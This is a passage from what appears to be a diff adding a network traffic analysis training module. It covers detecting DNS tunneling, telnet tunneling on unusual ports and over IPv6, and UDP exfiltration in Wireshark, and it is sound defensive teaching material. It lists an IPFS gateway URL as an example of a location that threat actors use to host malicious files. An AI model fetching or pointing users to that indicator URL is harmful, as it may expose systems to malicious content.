+<td>As shown above DNS tunneling can be helpful for attackers trying to get data out of our network without getting caught.</td>
+</tr>
+<tr>
+<td><code>2. Command and Control</code></td>
+<td>Some malware and malicious agents will utilize DNS tunneling on compromised systems in order to communicate back to their command and control servers. Notably, we might see this method of usage in botnets.</td>
+</tr>
+<tr>
+<td><code>3. Bypassing Firewalls and Proxies</code></td>
+<td>DNS tunneling allows attackers to bypass firewalls and web proxies that only monitor HTTP/HTTPs traffic. DNS traffic is traditionally allowed to pass through network boundaries. As such, it is important that we monitor and control this traffic.</td>
+</tr>
+<tr>
+<td><code>4. Domain Generation Algorithms (DGAs)</code></td>
+<td>Some more advanced malware will utilize DNS tunnels to communicate back to their command and control servers that use dynamically generated domain names through DGAs. This makes it much more difficult for us to detect and block these domain names.</td>
+</tr>
+</tbody>
+</table>
+<h3 id="the-interplanetary-file-system-and-dns-tunneling">The Interplanetary File System and DNS Tunneling</h3>
+<p>It has been observed in recent years that advanced threat actors will utilize the Interplanetary file System to store and pull malicious files. As such we should always watch out for DNS and HTTP/HTTPs traffic to URIs like the following:</p>
+<ul>
+<li><code>https://cloudflare-ipfs.com/ipfs/QmS6eyoGjENZTMxM7UdqBk6Z3U3TZPAVeJXdgp9VK4o1Sz</code></li>
+</ul>
+<p>These forms of attacks can be exceptionally difficult to detect as IPFS innately operates on a peer to peer basis. To learn more, we can research into IPFS.</p>
+<p><a href="https://developers.cloudflare.com/web3/ipfs-gateway/concepts/ipfs/">Interplanetary File System</a></p>
+<h2 id="strange-telnet-udp-connections">Strange Telnet &amp; UDP Connections</h2>
+<hr>
+<p>When we look for strange traffic, we should always consider telnet and UDP traffic. After all, these can be overlooked, but can especially revealing during our traffic analysis efforts.</p>
+<hr>
+<h3 id="telnet">Telnet</h3>
+<p><img src="storage\modules\229\Internet.png" alt=""></p>
+<p>Telnet is a network protocol that allows a bidirectional interactive communication session between two devices over a network. This protocol was developed in the 1970s and was defined in RFC 854. As of recent years, its usage has decreased significantly as opposed to SSH.</p>
+<p>In many older cases, such as our Windows NT like machines, they may still utilize telnet to provide remote command and control to microsoft terminal services.</p>
+<p>However, we should always watch for weird and strange telnet communications as it can also be used by attackers for malicious purposes such as data exfiltration and tunneling.</p>
+<h3 id="finding-traditional-telnet-traffic-port-23">Finding Traditional Telnet Traffic Port 23</h3>
+<p><strong>Related PCAP File(s)</strong>:</p>
+<ul>
+<li><code>telnet_tunneling_23.pcapng</code></li>
+</ul>
+<p>Suppose we were to open Wireshark, we might notice some telnet communications originating from Port 23. In this case, we can always inspect this traffic further.</p>
+<p><img src="storage\modules\229\1-telnet.png" alt="Telnet"></p>
+<p>Fortunately for us, telnet traffic tends to be decrypted and easily inspectable, but like ICMP, DNS, and other tunneling methods, attackers may encrypt, encode, or obfuscate this text. So we should always be careful.</p>
+<p><img src="storage\modules\229\2-telnet.png" alt="Telnet"></p>
+<h3 id="unrecognized-tcp-telnet-in-wireshark">Unrecognized TCP Telnet in Wireshark</h3>
+<p><strong>Related PCAP File(s)</strong>:</p>
+<ul>
+<li><code>telnet_tunneling_9999.pcapng</code></li>
+</ul>
+<p>Telnet is just a communication protocol, and as such can be easily switched to another port by an attacker. Keeping an eye on these strange port communications can allow us to find potentially malicious actions. Lets take the following for instance.</p>
+<p><img src="storage\modules\229\3-telnet.png" alt="Telnet"></p>
+<p>We may see a ton of communications from one client on port 9999. We can dive into this a little further by looking at the contents of these communications.</p>
+<p><img src="storage\modules\229\4-telnet.png" alt="Telnet"></p>
+<p>If we noticed something like above, we would want to follow this TCP stream.</p>
+<p><img src="storage\modules\229\5-telnet.png" alt="Telnet"></p>
+<p>Doing so can allow us to inspect potentially malicious actions.</p>
+<hr>
+<h3 id="telnet-protocol-through-ipv6">Telnet Protocol through IPv6</h3>
+<p><strong>Related PCAP File(s)</strong>:</p>
+<ul>
+<li><code>telnet_tunneling_ipv6.pcapng</code></li>
+</ul>
+<p>After all, unless our local network is configured to utilize IPv6, observing IPv6 traffic can be an indicator of bad actions within our environment. We might notice the usage of IPv6 addresses for telnet like the following.</p>
+<p><img src="storage\modules\229\6-telnet.png" alt="Telnet"></p>
+<p>We can narrow down our filter in Wireshark to only show telnet traffic from these addresses with the following filter.</p>
+<ul>
+<li><code>((ipv6.src_host == fe80::c9c8:ed3:1b10:f10b) or (ipv6.dst_host == fe80::c9c8:ed3:1b10:f10b)) and telnet</code></li>
+</ul>
+<p><img src="storage\modules\229\7-telnet.png" alt="Telnet"></p>
+<p>Likewise, we can inspect the contents of these packets through their data field, or by following the TCP stream.</p>
+<p><img src="storage\modules\229\8-telnet.png" alt="Telnet"></p>
+<h3 id="watching-udp-communications">Watching UDP Communications</h3>
+<p><strong>Related PCAP File(s)</strong>:</p>
+<ul>
+<li><code>udp_tunneling.pcapng</code></li>
+</ul>
+<p>On the other hand, attackers might opt to use UDP connections over TCP in their exfiltration efforts.</p>
+<p><img src="storage\modules\229\udp-tcp.jpg" alt="TCP vs UDP"></p>
+<p>One of the biggest distinguishing aspects between TCP and UDP is that UDP is connectionless and provides fast transmission. Let's take the following traffic for instance.</p>
+<p><img src="storage\modules\229\1-udp.png" alt="UDP"></p>
+<p>We will notice that instead of a SYN, SYN/ACK, ACK sequence, the communications are immediately sent over to the recipient. Like TCP, we can follow UDP traffic in Wireshark, and inspect its contents.</p>
+<p><img src="storage\modules\229\2-udp.png" alt="UDP"></p>
+<h3 id="common-uses-of-udp">Common Uses of UDP</h3>
+<p>UDP although less reliable than TCP provides quicker connections through its connectionless state. As such, we might find legitimate traffic that uses UDP like the following:</p>
+<table>
+<thead>
+<tr>
+<th><strong>Step</strong></th>
+<th><strong>Description</strong></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>1. Real-time Applications</code></td>
+<td>Applications like streaming media, online gaming, real-time voice and video communications</td>
+</tr>
+<tr>
+<td><code>2. DNS (Domain Name System)</code></td>
+<td>DNS queries and responses use UDP</td>
+</tr>
+<tr>
+<td><code>3. DHCP (Dynamic Host Configuration Protocol)</code></td>
+<td>DHCP uses UDP to assign IP addresses and configuration information to network devices.</td>
+</tr>
+<tr>
+<td><code>4. SNMP (Simple Network Management Protocol)</code></td>
+<td>SNMP uses UDP for network monitoring and management</td>
+</tr>
+<tr>
+<td><code>5. TFTP (Trivial File Transfer Protocol)</code></td>
+<td>TFTP uses UDP for simple file transfers, commonly used by older Windows systems and others.</td>
+</tr>
+</tbody>
+</table>
+</div></body></html>
